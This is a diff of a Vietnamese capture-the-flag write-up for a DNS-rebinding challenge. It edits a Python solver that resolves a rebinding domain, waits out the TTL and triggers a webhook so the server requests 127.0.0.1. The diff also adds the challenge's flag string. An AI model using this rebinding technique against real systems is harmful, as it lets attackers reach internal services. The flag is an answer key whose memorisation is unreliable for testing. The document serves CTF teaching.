@@ -134,11 +134,11 @@ time.sleep(5)
 
 try:
     ip = socket.gethostbyname("08080808.7f000001.rbndr.us")
-    print(f"DNS resolve hiện tại: {ip} (nên là 127.0.0.1 nếu rebinding thành công)")
+    print(f"DNS resolve hiện tại: {ip} ")
 except:
     print("Không resolve được domain")
 
-# Bước 3: Trigger webhook
+
 print("Đang trigger webhook...")
 trigger_data = {"id": webhook_id}
 response = requests.post(f"{TARGET_URL}/trigger", data=trigger_data)
@@ -148,11 +148,15 @@ if response.status_code == 200:
         result = response.json()
         print(f"Thành công! Status: {result.get('status', 'N/A')}")
         print(f"Response: {result.get('response', 'No response')}")
-        # Flag thường ở đây nếu rebinding đúng
     except:
         print(f"Response JSON lỗi: {response.text}")
 else:
     print(f"Lỗi trigger: {response.status_code} - {response.text}")
 
 ```
+Nhập URL lấy ID sau đó đợi 5s để hết thời gian time to live sau đó mới điền id vào trigger để DNS phân giải thành 127.0.0.1
+## FLAG
 
+![alt text](image-2.png)
+
+sun{dns_r3b1nd1ng_1s_sup3r_c00l!_ff4bd67cd1}
